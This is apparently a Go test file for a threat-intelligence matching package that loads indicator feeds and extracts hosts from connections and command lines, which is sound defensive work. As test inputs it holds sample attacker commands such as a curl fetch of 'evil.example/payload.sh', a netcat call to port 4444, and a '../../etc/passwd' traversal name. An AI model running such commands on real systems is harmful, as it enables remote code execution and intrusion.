package intel

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// feedDir writes a set of feed files and loads them.
func feedDir(t *testing.T, files map[string]string) *Set {
	t.Helper()
	dir := t.TempDir()
	for name, body := range files {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	s := NewSet()
	if err := s.LoadDir(dir); err != nil {
		t.Fatal(err)
	}
	return s
}

func TestMatchesIPDomainAndHash(t *testing.T) {
	s := feedDir(t, map[string]string{
		"c2.high.txt": "198.51.100.7\tcobalt-strike\n" +
			"evil.example\tphishing\n" +
			strings.Repeat("a", 64) + "\tdropper\n",
	})
	if m, ok := s.LookupIP("198.51.100.7"); !ok || m.Category != "cobalt-strike" {
		t.Fatalf("ip lookup failed: %+v ok=%v", m, ok)
	}
	if m, ok := s.LookupDomain("evil.example"); !ok || m.Source != "c2" {
		t.Fatalf("domain lookup failed: %+v ok=%v", m, ok)
	}
	if _, ok := s.LookupHash(strings.ToUpper(strings.Repeat("a", 64))); !ok {
		t.Fatal("hash lookup must be case-insensitive")
	}
	if m, _ := s.LookupIP("198.51.100.7"); m.Points != Points(ConfidenceHigh) {
		t.Fatalf("filename confidence must apply, got %d", m.Points)
	}
}

func TestSubdomainsMatchTheirListedParent(t *testing.T) {
	s := feedDir(t, map[string]string{"c2.txt": "evil.example\n"})
	if m, ok := s.LookupDomain("cdn.assets.evil.example"); !ok || m.Value != "evil.example" {
		t.Fatalf("a listed parent must catch its subdomains: %+v ok=%v", m, ok)
	}
}

// The exclusion that stops the whole estate lighting up.
func TestPrivateAndUnroutableAddressesNeverMatch(t *testing.T) {
	s := feedDir(t, map[string]string{
		// A feed containing RFC1918 space is not hypothetical.
		"bad.high.txt": "10.0.0.5\n172.31.45.193\n192.168.1.1\n127.0.0.1\n169.254.169.254\n100.64.1.1\n",
	})
	for _, ip := range []string{"10.0.0.5", "172.31.45.193", "192.168.1.1", "127.0.0.1", "169.254.169.254", "100.64.1.1"} {
		if _, ok := s.LookupIP(ip); ok {
			t.Fatalf("%s is unroutable and must never match a public feed", ip)
		}
	}
	// 172.31.45.193 is this estate's own control plane. A match there would
	// mark every agent's uplink as C2 traffic.
	if st := s.Status(); st.IPs != 0 {
		t.Fatalf("unroutable feed entries must be rejected at load, %d kept", st.IPs)
	}
}

func TestTooBroadDomainEntriesAreRejectedAtLoad(t *testing.T) {
	s := feedDir(t, map[string]string{"broken.high.txt": "com\nco.uk\nevil.example\n"})
	if _, ok := s.LookupDomain("anything.com"); ok {
		t.Fatal("a feed entry of 'com' must not match every .com domain")
	}
	if _, ok := s.LookupDomain("bank.co.uk"); ok {
		t.Fatal("a feed entry of 'co.uk' must not match every .co.uk domain")
	}
	if _, ok := s.LookupDomain("evil.example"); !ok {
		t.Fatal("the valid entry in the same file must still load")
	}
}

func TestAllowlistBeatsTheFeeds(t *testing.T) {
	s := feedDir(t, map[string]string{
		"allow.txt":    "203.0.113.9\nourcdn.example\n",
		"bad.high.txt": "203.0.113.9\nourcdn.example\n",
	})
	if _, ok := s.LookupIP("203.0.113.9"); ok {
		t.Fatal("an allowlisted IP must not match even when a feed lists it")
	}
	if _, ok := s.LookupDomain("assets.ourcdn.example"); ok {
		t.Fatal("an allowlisted parent domain must protect its children")
	}
}

func TestOverlyBroadCIDRsAreRejected(t *testing.T) {
	s := feedDir(t, map[string]string{"bad.high.txt": "1.0.0.0/4\n203.0.113.0/24\n"})
	if _, ok := s.LookupIP("1.2.3.4"); ok {
		t.Fatal("a /4 covers an eighth of the internet and must be rejected as a feed error")
	}
	if m, ok := s.LookupIP("203.0.113.55"); !ok || m.Kind != KindCIDR {
		t.Fatalf("a sane /24 must still match: %+v ok=%v", m, ok)
	}
}

func TestExtractionFindsAConnectionDestination(t *testing.T) {
	// This is the shape tetrabridge renders a sock argument into.
	got := FromKprobe("outbound-connections", "198.51.100.7:443")
	if len(got) != 1 || got[0].Value != "198.51.100.7" || got[0].Where != "connection" {
		t.Fatalf("expected one connection candidate, got %+v", got)
	}
}

// The false positive that would discredit the whole feature.
func TestVersionStringsAreNotTreatedAsAddresses(t *testing.T) {
	for _, args := range []string{
		"--version openssl-1.1.1",
		"install libfoo 2.4.6.8-rc1",
		"-Dversion=1.2.3.4-SNAPSHOT",
		"/usr/lib/python3.11/site-packages",
	} {
		if got := FromCommandLine("/usr/bin/apt", args); len(got) != 0 {
			t.Fatalf("args %q must yield no indicators, got %+v", args, got)
		}
	}
}

func TestURLsAndBareHostsAreExtractedFromNetworkClients(t *testing.T) {
	got := FromCommandLine("/usr/bin/curl", "-sSL https://evil.example/payload.sh")
	if len(got) != 1 || got[0].Value != "evil.example" || got[0].Kind != KindDomain {
		t.Fatalf("expected the URL host, got %+v", got)
	}
	// A bare hostname is only read for binaries whose arguments name hosts.
	if got := FromCommandLine("/usr/bin/nc", "evil.example 4444"); len(got) != 1 {
		t.Fatalf("nc's target host must be extracted, got %+v", got)
	}
	if got := FromCommandLine("/bin/cat", "notes.evil.example"); len(got) != 0 {
		t.Fatalf("a filename argument to cat is not a host, got %+v", got)
	}
}

func TestACommandLineMentionScoresLessThanAConnection(t *testing.T) {
	s := feedDir(t, map[string]string{"c2.high.txt": "198.51.100.7\n"})

	conn := MatchAll(s, FromKprobe("outbound-connections", "198.51.100.7:443"))
	cli := MatchAll(s, FromCommandLine("/usr/bin/curl", "http://198.51.100.7/x"))
	if len(conn) != 1 || len(cli) != 1 {
		t.Fatalf("expected one match each: conn=%v cli=%v", conn, cli)
	}
	if cli[0].Points >= conn[0].Points {
		t.Fatalf("a string on a command line must score below an established connection: cli=%d conn=%d",
			cli[0].Points, conn[0].Points)
	}
}

func TestRepeatedMentionsCollapseToOneFinding(t *testing.T) {
	s := feedDir(t, map[string]string{"c2.high.txt": "evil.example\n"})
	got := MatchAll(s, FromCommandLine("/usr/bin/curl",
		"https://evil.example/a https://evil.example/b https://cdn.evil.example/c"))
	if len(got) != 1 {
		t.Fatalf("one indicator named three times is one finding, got %d: %+v", len(got), got)
	}
}

func TestHighConfidenceHitCanReachTheCriticalBand(t *testing.T) {
	// The deliberate design point: external corroboration outranks inference.
	// A confirmed C2 connection must not need a second signal to be critical.
	if Points(ConfidenceHigh) < 30 {
		t.Fatalf("a high-confidence connection scores %d; it must be able to carry a chain to critical",
			Points(ConfidenceHigh))
	}
	if Points(ConfidenceLow) >= Points(ConfidenceMedium) || Points(ConfidenceMedium) >= Points(ConfidenceHigh) {
		t.Fatal("confidence tiers must be strictly ordered")
	}
}

func TestEmptyDirLoadsCleanlyAndReportsNotLoadedVsEmpty(t *testing.T) {
	s := NewSet()
	if st := s.Status(); st.Loaded {
		t.Fatal("a set that was never loaded must report Loaded=false")
	}
	s2 := feedDir(t, map[string]string{})
	if st := s2.Status(); !st.Loaded || st.Indicators != 0 {
		t.Fatalf("an empty feed dir is loaded-but-empty, got %+v", st)
	}
}

func TestParseErrorsAreReportedNotSwallowed(t *testing.T) {
	s := feedDir(t, map[string]string{"junk.txt": "com\nnot an indicator\n!!!\n"})
	st := s.Status()
	if len(st.Errors) == 0 {
		t.Fatal("unparseable entries must surface in Status, or a broken feed looks like a clean one")
	}
}

func TestFeedNameCannotOverwriteTheAllowlistOrEscapeTheDir(t *testing.T) {
	if sanitiseFeedName("allow") != "" {
		t.Fatal("a feed must never be able to overwrite the operator allowlist")
	}
	if got := sanitiseFeedName("../../etc/passwd"); strings.ContainsAny(got, "./") {
		t.Fatalf("feed name must not retain path separators, got %q", got)
	}
}

func TestHasherSkipsWhatItShouldAndCaches(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "bin")
	if err := os.WriteFile(p, []byte("hello"), 0o755); err != nil {
		t.Fatal(err)
	}
	h := NewHasher()
	got, ok := h.Hash(p)
	if !ok || len(got) != 64 {
		t.Fatalf("expected a sha256, got %q ok=%v", got, ok)
	}
	if _, ok := h.Hash(filepath.Join(dir, "missing")); ok {
		t.Fatal("a missing file must be a declined hash, not an error")
	}
	if _, ok := h.Hash(dir); ok {
		t.Fatal("a directory is not hashable")
	}
	h.Hash(p)
	if _, hits, _ := h.Stats(); hits == 0 {
		t.Fatal("a repeat hash of an unchanged file must come from the cache")
	}
}

// Real published feeds arrive in shapes the naive one-per-line reader would
// mangle. Both of these are formats the estate's configured feeds actually use.
func TestHostsFileAndURLFeedFormatsLoad(t *testing.T) {
	s := feedDir(t, map[string]string{
		"hosts.high.txt": "0.0.0.0 evil.example\n127.0.0.1 bad.example\n",
		"urls.high.txt":  "http://dropper.example/payload.sh\nhttps://198.51.100.9:8443/beacon\n",
	})
	for _, d := range []string{"evil.example", "bad.example", "dropper.example"} {
		if _, ok := s.LookupDomain(d); !ok {
			t.Errorf("%s did not load from its feed format", d)
		}
	}
	if _, ok := s.LookupIP("198.51.100.9"); !ok {
		t.Error("an IP inside a URL did not load")
	}
	// The sinkhole address must NOT become an indicator in its own right.
	if _, ok := s.LookupIP("127.0.0.1"); ok {
		t.Fatal("a hosts-file sinkhole address was loaded as an indicator")
	}
}

// The widest door in the package must refuse to guess.
//
// Asserted through the SET rather than through normaliseFeedLine, because the
// property that matters is "no garbage becomes a live indicator", and that is
// enforced by normalisation and add() together. Testing the helper alone would
// pass while the pair leaked, or fail while the pair was sound — as this test
// did on its first writing.
func TestUnrecognisedFeedShapesNeverBecomeIndicators(t *testing.T) {
	s := feedDir(t, map[string]string{
		"junk.high.txt": "evil.example # inline comment style we do not parse\n" +
			"1.2.3.4,5.6.7.8\n" +
			"severity=high host=evil.example\n" +
			"evil.example something-else\n",
	})
	st := s.Status()
	if st.Indicators != 0 {
		t.Fatalf("unrecognised shapes produced %d live indicators", st.Indicators)
	}
	// And none of them may be reachable by lookup under any spelling.
	for _, q := range []string{"evil.example", "1.2.3.4", "5.6.7.8"} {
		if _, ok := s.Lookup(q); ok {
			t.Errorf("%q matched despite arriving in an unparseable line", q)
		}
	}
	// Skipping must be REPORTED, or a feed whose format changed looks clean.
	if len(st.Errors) == 0 {
		t.Fatal("skipped lines were not reported; a changed feed format would look like an empty feed")
	}
}

func TestSlashSlashCommentsAreIgnored(t *testing.T) {
	s := feedDir(t, map[string]string{"c2.high.txt": "// generated by something\nevil.example\n"})
	if st := s.Status(); st.Domains != 1 {
		t.Fatalf("expected exactly the one real indicator, got %d (%v)", st.Domains, st.Errors)
	}
}

func TestFeedFileAbsentMeansRefreshDisabled(t *testing.T) {
	cfg, err := LoadRefreshConfig(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Enabled() {
		t.Fatal("no feeds.yaml must mean refresh is OFF — that is every deployment's default")
	}
}

func TestFeedFileEnablesRefreshAndDefaultsTheInterval(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, FeedFileName), []byte(
		"feeds:\n  - name: feodo-c2\n    url: https://example.invalid/list.txt\n    confidence: medium\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg, err := LoadRefreshConfig(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !cfg.Enabled() {
		t.Fatal("a file listing feeds must enable refresh")
	}
	// A file that names feeds but no interval means "refresh these", not
	// "never refresh these" — zero would silently disable what it enabled.
	if cfg.Interval <= 0 {
		t.Fatal("interval defaulted to zero, which disables the feeds the file exists to enable")
	}
}

func TestMalformedFeedFileIsAnErrorNotSilentlyOff(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, FeedFileName), []byte("feeds: [ this is not valid"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := LoadRefreshConfig(dir); err == nil {
		t.Fatal("a malformed feeds.yaml must be reported; silently not refreshing is the failure mode this package exists to avoid")
	}
}

// The exact shape URLhaus publishes: a sinkhole address, a TAB, the domain.
//
// This is a regression test for a measured defect, not a hypothetical. This
// package's optional-metadata format is ALSO tab separated, so splitting fields
// before recognising the hosts-file shape read "127.0.0.1" as the indicator and
// the domain as its category. The address was then correctly rejected as
// loopback and the domain silently discarded: a 400-entry feed loaded FIVE
// indicators and reported itself parsed.
func TestTabSeparatedHostsFileLoadsTheDomainNotTheSinkhole(t *testing.T) {
	s := feedDir(t, map[string]string{
		"urlhaus.medium.txt": "127.0.0.1\t0022a601.pphost.net\n0.0.0.0\t123.ywxww.net\n",
	})
	st := s.Status()
	if st.Domains != 2 {
		t.Fatalf("expected both domains, got %d domains / %d ips (%v)", st.Domains, st.IPs, st.Errors)
	}
	for _, d := range []string{"0022a601.pphost.net", "123.ywxww.net"} {
		if _, ok := s.LookupDomain(d); !ok {
			t.Errorf("%s did not load from a tab-separated hosts line", d)
		}
	}
	if st.IPs != 0 {
		t.Fatal("a sinkhole address was loaded as an indicator in its own right")
	}
}

// The metadata format must still work — the hosts-file check must not swallow
// a legitimate "<indicator>TAB<category>TAB<confidence>" line.
func TestTabSeparatedMetadataStillParses(t *testing.T) {
	s := feedDir(t, map[string]string{
		"c2.medium.txt": "198.51.100.7\tcobalt-strike\thigh\n",
	})
	m, ok := s.LookupIP("198.51.100.7")
	if !ok {
		t.Fatal("a metadata-form line did not load")
	}
	if m.Category != "cobalt-strike" || m.Confidence != "high" {
		t.Fatalf("metadata lost: %+v", m)
	}
}
